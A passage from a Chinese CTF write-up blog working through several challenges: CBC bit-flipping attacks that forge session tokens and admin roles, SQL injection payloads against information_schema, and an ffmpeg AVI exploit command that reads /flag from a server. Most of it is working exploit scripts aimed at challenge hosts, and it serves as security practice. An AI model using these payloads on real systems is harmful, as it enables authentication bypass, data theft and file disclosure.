</span></span><span style="display:flex;"><span>    user_key_json_decode[<span style="color:#e6db74">&#39;signed_key&#39;</span>] <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(iv_prefix <span style="color:#f92672">+</span> iv <span style="color:#f92672">+</span> cipher)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(json<span style="color:#f92672">.</span>dumps(user_key_json_decode))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_user_info</span>(key):
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">+</span> host <span style="color:#f92672">+</span>  <span style="color:#e6db74">&#34;/frontend/api/v1/user/info&#34;</span>, headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Key&#34;</span>: key})
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;code&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">100</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;获取成功！&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;data&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modify_role_palin</span>(key, role):
</span></span><span style="display:flex;"><span>    user_key_decode <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(user_key)
</span></span><span style="display:flex;"><span>    user_key_json_decode <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(user_key_decode)
</span></span><span style="display:flex;"><span>    user_key_json_decode[<span style="color:#e6db74">&#39;role&#39;</span>] <span style="color:#f92672">=</span> role
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(json<span style="color:#f92672">.</span>dumps(user_key_json_decode))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;翻转 Key:&#34;</span>)
</span></span><span style="display:flex;"><span>user_key <span style="color:#f92672">=</span> cbc_attack(<span style="color:#e6db74">&#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9&#34;</span>, <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;{&#34;role&#34;:3,&#34;user_&#39;</span>, <span style="color:#e6db74">&#39;{&#34;role&#34;:1,&#34;user_&#39;</span>)
</span></span><span style="display:flex;"><span>user_key <span style="color:#f92672">=</span> modify_role_palin(user_key, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>print(user_key)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;测试拉取用户信息：&#34;</span>)
</span></span><span style="display:flex;"><span>user_info <span style="color:#f92672">=</span> get_user_info(user_key)
</span></span><span style="display:flex;"><span>print(user_info)
</span></span></code></pre></div><p>改完后把新的密文作为<code>key</code>访问, 刷新页面, 成功登录, 发现音频上传的功能.看赵师傅wp说<strong>上传不同类型的文件然后下载上传的文件(如下图上传后可以在network中发现url), 对比上传前后文件的md5值发现对avi文件有进行处理</strong>, 这个姿势学到了.</p>
<p><img loading="lazy" src="image-20200202225510224.png" alt="image-20200202225510224"  />
</p>
<p>猜测后台使用ffmpeg来对音视频进行处理(misc的东西我一点猜不到), 然后使用对应的漏洞</p>
<p><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py">https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py</a></p>
<pre tabindex="0"><code>python3 gen_xbin_avi.py file:///flag test.avi
</code></pre><p>上传, 下载, 播放, 发现flag</p>
<p><img loading="lazy" src="image-20200203014414962.png" alt="image-20200203014414962"  />
</p>
<h2 id="实验吧-简单的登陆题">实验吧 简单的登陆题<a hidden class="anchor" aria-hidden="true" href="#实验吧-简单的登陆题">#</a></h2>
<p>真难</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># -*- coding:utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">denglu</span>(payload,idx,c1,c2):
</span></span><span style="display:flex;"><span>    url<span style="color:#f92672">=</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;id&#39;</span>: payload}
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>payload)
</span></span><span style="display:flex;"><span>    Set_Cookie<span style="color:#f92672">=</span>r<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Set-Cookie&#39;</span>]
</span></span><span style="display:flex;"><span>    iv<span style="color:#f92672">=</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;iv=(.*?),&#34;</span>, Set_Cookie)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    cipher<span style="color:#f92672">=</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;cipher=(.*)&#34;</span>, Set_Cookie)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    iv_raw <span style="color:#f92672">=</span> b64decode(urllib<span style="color:#f92672">.</span>unquote(iv))
</span></span><span style="display:flex;"><span>    cipher_raw<span style="color:#f92672">=</span>b64decode(urllib<span style="color:#f92672">.</span>unquote(cipher))
</span></span><span style="display:flex;"><span>    lst<span style="color:#f92672">=</span>list(cipher_raw)
</span></span><span style="display:flex;"><span>    lst[idx]<span style="color:#f92672">=</span>chr(ord(lst[idx])<span style="color:#f92672">^</span>ord(c1)<span style="color:#f92672">^</span>ord(c2))
</span></span><span style="display:flex;"><span>    cipher_new<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(lst)
</span></span><span style="display:flex;"><span>    cipher_new<span style="color:#f92672">=</span>urllib<span style="color:#f92672">.</span>quote(b64encode(cipher_new))
</span></span><span style="display:flex;"><span>    cookie_new<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;iv&#39;</span>: iv,<span style="color:#e6db74">&#39;cipher&#39;</span>:cipher_new}
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, cookies<span style="color:#f92672">=</span>cookie_new)
</span></span><span style="display:flex;"><span>    cont<span style="color:#f92672">=</span>r<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>    plain <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;base64_decode\(&#39;(.*?)&#39;\)&#34;</span>, cont)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    plain <span style="color:#f92672">=</span> b64decode(plain)
</span></span><span style="display:flex;"><span>    first<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a:1:{s:2:&#34;id&#34;;s:&#39;</span>
</span></span><span style="display:flex;"><span>    iv_new<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        iv_new <span style="color:#f92672">+=</span> chr(ord(first[i])<span style="color:#f92672">^</span>ord(plain[i])<span style="color:#f92672">^</span>ord(iv_raw[i]))
</span></span><span style="display:flex;"><span>    iv_new <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>quote(b64encode(iv_new))
</span></span><span style="display:flex;"><span>    cookie_new <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;iv&#39;</span>: iv_new, <span style="color:#e6db74">&#39;cipher&#39;</span>: cipher_new}
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, cookies<span style="color:#f92672">=</span>cookie_new)
</span></span><span style="display:flex;"><span>    rcont <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>    print rcont
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>denglu(<span style="color:#e6db74">&#39;12&#39;</span>,<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;#&#39;</span>)
</span></span><span style="display:flex;"><span>denglu(<span style="color:#e6db74">&#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#39;</span><span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">0</span>),<span style="color:#ae81ff">6</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>)
</span></span><span style="display:flex;"><span>denglu(<span style="color:#e6db74">&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#39;</span><span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">0</span>),<span style="color:#ae81ff">7</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>)
</span></span><span style="display:flex;"><span>denglu(<span style="color:#e6db74">&#34;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select 3)c);&#34;</span><span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">0</span>),<span style="color:#ae81ff">7</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>)
</span></span><span style="display:flex;"><span>denglu(<span style="color:#e6db74">&#34;0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);&#34;</span><span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">0</span>),<span style="color:#ae81ff">6</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>)
</span></span></code></pre></div><p>自己的脚本会出现错误</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;</span>
</span></span><span style="display:flex;"><span>post<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;id&#39;</span>:<span style="color:#e6db74">&#34;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#34;</span><span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">0</span>)}
</span></span><span style="display:flex;"><span>responce<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>post)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>iv<span style="color:#f92672">=</span>base64<span style="color:#f92672">.</span>b64decode(urllib<span style="color:#f92672">.</span>unquote(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;iv=(.*?),&#34;</span>,responce<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Set-Cookie&#39;</span>])[<span style="color:#ae81ff">0</span>]))
</span></span><span style="display:flex;"><span>cipher<span style="color:#f92672">=</span>base64<span style="color:#f92672">.</span>b64decode(urllib<span style="color:#f92672">.</span>unquote(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;cipher=(.*)&#34;</span>,responce<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Set-Cookie&#39;</span>])[<span style="color:#ae81ff">0</span>]))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">answer</span>(cipher,old_iv,offset,old_letter,new_letter):
</span></span><span style="display:flex;"><span>    cipher<span style="color:#f92672">=</span>list(cipher)
</span></span><span style="display:flex;"><span>    cipher[offset]<span style="color:#f92672">=</span>chr(ord(old_letter)<span style="color:#f92672">^</span>ord(new_letter)<span style="color:#f92672">^</span>ord(cipher[offset]))
</span></span><span style="display:flex;"><span>    cipher<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(cipher)
</span></span><span style="display:flex;"><span>    cookie<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;cipher&#39;</span>:urllib<span style="color:#f92672">.</span>quote(base64<span style="color:#f92672">.</span>b64encode(cipher)),<span style="color:#e6db74">&#39;iv&#39;</span>:urllib<span style="color:#f92672">.</span>quote(base64<span style="color:#f92672">.</span>b64encode(old_iv))}
</span></span><span style="display:flex;"><span>    res<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url,cookies<span style="color:#f92672">=</span>cookie)
</span></span><span style="display:flex;"><span>    wrong_plain<span style="color:#f92672">=</span>base64<span style="color:#f92672">.</span>b64decode(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;base64_decode\(&#39;(.*?)&#39;\)&#34;</span>,res<span style="color:#f92672">.</span>content)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    new_iv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    right<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a:1:{s:2:&#34;id&#34;;s:&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        new_iv<span style="color:#f92672">+=</span>chr(ord(old_iv[i])<span style="color:#f92672">^</span>ord(wrong_plain[i])<span style="color:#f92672">^</span>ord(right[i]))
</span></span><span style="display:flex;"><span>    cookie<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;cipher&#39;</span>:urllib<span style="color:#f92672">.</span>quote(base64<span style="color:#f92672">.</span>b64encode(cipher)),<span style="color:#e6db74">&#39;iv&#39;</span>:urllib<span style="color:#f92672">.</span>quote(base64<span style="color:#f92672">.</span>b64encode(new_iv))}
</span></span><span style="display:flex;"><span>    res<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url,cookies<span style="color:#f92672">=</span>cookie)
</span></span><span style="display:flex;"><span>    print res<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>answer(cipher,iv,<span style="color:#ae81ff">7</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>)
</span></span></code></pre></div><p>错误报告如下：</p>
<pre tabindex="0"><code>You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#39;2)ion select * from((select 1)a
join (select 2)b join (select 3)c);&#39; at line 1
</code></pre><p>也就是说改变的位置发生了变化，但是对另一些payload来说却可以正常运行，很是奇怪，难道是正则表达式的问题?
明白了，正则表达式没有问题，是自己以为前面字段一样序列化之后前面的字段也会一样的原因导致，其实是不一样的
一个偏移位置为6，一个为7，这个正则要好好看看</p>
<h2 id="javisoj-xman-2019-xbitf">javisoj xman 2019 xbitf<a hidden class="anchor" aria-hidden="true" href="#javisoj-xman-2019-xbitf">#</a></h2>
<p>源代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Unbuffered</span>(object):
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">def</span> __init__(self, stream):
</span></span><span style="display:flex;"><span>       self<span style="color:#f92672">.</span>stream <span style="color:#f92672">=</span> stream
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write</span>(self, data):
</span></span><span style="display:flex;"><span>       self<span style="color:#f92672">.</span>stream<span style="color:#f92672">.</span>write(data)
</span></span><span style="display:flex;"><span>       self<span style="color:#f92672">.</span>stream<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">def</span> __getattr__(self, attr):
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> getattr(self<span style="color:#f92672">.</span>stream, attr)
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout <span style="color:#f92672">=</span> Unbuffered(sys<span style="color:#f92672">.</span>stdout)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#import signal</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#signal.alarm(600)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">=</span>open(<span style="color:#e6db74">&#34;/root/xbitf/flag&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aes_cbc</span>(key,iv,m):
</span></span><span style="display:flex;"><span>    handler<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>new(key,AES<span style="color:#f92672">.</span>MODE_CBC,iv)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> handler<span style="color:#f92672">.</span>encrypt(m)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aes_cbc_dec</span>(key,iv,c):
</span></span><span style="display:flex;"><span>    handler<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>new(key,AES<span style="color:#f92672">.</span>MODE_CBC,iv)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> handler<span style="color:#f92672">.</span>decrypt(c<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;hex&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>iv<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;session=&#34;</span><span style="color:#f92672">+</span>session<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;;admin=0&#34;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>checksum<span style="color:#f92672">=</span>aes_cbc(key,iv,token)
</span></span><span style="display:flex;"><span>print token<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;;checksum=&#34;</span><span style="color:#f92672">+</span>checksum
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>    token_rcv<span style="color:#f92672">=</span>raw_input(<span style="color:#e6db74">&#34;token:&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> token_rcv<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;admin=&#34;</span>)[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">and</span> token_rcv<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;session=&#34;</span>)[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">16</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;hex&#34;</span>)<span style="color:#f92672">==</span>session:
</span></span><span style="display:flex;"><span>        c_rcv<span style="color:#f92672">=</span>token_rcv<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;checksum=&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>        m_rcv<span style="color:#f92672">=</span>aes_cbc_dec(key,iv,c_rcv)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 讲解码的结果打印出来</span>
</span></span><span style="display:flex;"><span>        print m_rcv
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> m_rcv<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;admin=&#34;</span>)[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;1&#39;</span>:
</span></span><span style="display:flex;"><span>            print flag
</span></span></code></pre></div><p>解题脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>plain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;session=c3b76cc709a8fddf;admin=0&#34;</span>
</span></span><span style="display:flex;"><span>checksum<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bit <span style="color:#f92672">=</span> (ord(checksum<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>)[<span style="color:#ae81ff">15</span>]) <span style="color:#f92672">^</span>ord(<span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;1&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 每个16位加密之后都会变成32位，这里要替换第一组的最后一个字节所加密后的内容</span>
</span></span><span style="display:flex;"><span>checksum_final <span style="color:#f92672">=</span> checksum[:<span style="color:#ae81ff">30</span>] <span style="color:#f92672">+</span> hex(bit)[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> checksum[<span style="color:#ae81ff">32</span>:]
</span></span><span style="display:flex;"><span>print checksum_final
</span></span></code></pre></div><p>在session通过之后就不再对session进行验证了，所以前16位乱码也没有关系。</p>
<p><img loading="lazy" src="image-20211114141845867.png" alt="image-20211114141845867"  />
</p>
<h2 id="bugku-login4">bugku login4<a hidden class="anchor" aria-hidden="true" href="#bugku-login4">#</a></h2>
<p>这道题由于自己没有认认真真去做，导致做出来花费了很多时间。相关writeup如下：</p>
<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80684485">https://blog.csdn.net/zpy1998zpy/article/details/80684485</a></p>
<p><a href="https://www.jianshu.com/p/a61756e54f4f">https://www.jianshu.com/p/a61756e54f4f</a></p>
<p>自己的代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$iv<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;4NyZMJ9AOU5JGstqfld10A%3D%3D&#39;</span>;
</span></span><span style="display:flex;"><span>$cipher<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">//username=bdmin password=111
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>$iv<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">urldecode</span>($iv));
</span></span><span style="display:flex;"><span>$cipher<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">urldecode</span>(($cipher)));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$source<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;bdmin&#39;</span>,<span style="color:#e6db74">&#39;password&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;111&#39;</span>);
</span></span><span style="display:flex;"><span>$plain<span style="color:#f92672">=</span><span style="color:#a6e22e">serialize</span>($source);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$plain1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($plain,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>$plain2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($plain,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$cipher[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">ord</span>($cipher[<span style="color:#ae81ff">9</span>])<span style="color:#f92672">^</span><span style="color:#a6e22e">ord</span>(<span style="color:#e6db74">&#39;b&#39;</span>)<span style="color:#f92672">^</span><span style="color:#a6e22e">ord</span>(<span style="color:#e6db74">&#39;a&#39;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$new_iv<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>$wrong_plain<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#34;U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ==&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">16</span>;$i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>    $new_iv<span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">ord</span>($wrong_plain[$i])<span style="color:#f92672">^</span><span style="color:#a6e22e">ord</span>($plain1[$i])<span style="color:#f92672">^</span><span style="color:#a6e22e">ord</span>($iv[$i]));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">base64_encode</span>($new_iv))<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;   &#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">base64_encode</span>($cipher));
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ch3n9w.github.io/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/">
    <span class="title">« Prev</span>
    <br>
    <span>网鼎杯2020 web</span>
  </a>
